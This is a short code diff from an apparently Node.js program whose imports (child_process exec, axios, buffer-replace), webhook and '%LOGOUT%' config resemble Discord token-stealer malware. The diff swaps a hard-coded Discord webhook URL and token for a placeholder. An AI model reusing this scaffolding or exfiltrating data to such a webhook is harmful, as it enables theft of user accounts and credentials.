@@ -4,7 +4,7 @@ const https = require('https');
 const { exec } = require('child_process');
 const axios = require('axios');
 const buf_replace = require('buffer-replace');
-const webhook = "https://discord.com/api/webhooks/942121583957381140/Z3Z95cE3MZoI0Lo-_L1AdgYHEtw0qy1hiVlvJRnFE-nv1zFO-2lLKCPYfaXmrBPuum5C"
+const webhook = "da_webhook"
 
 const config = {
     "logout": "%LOGOUT%1",
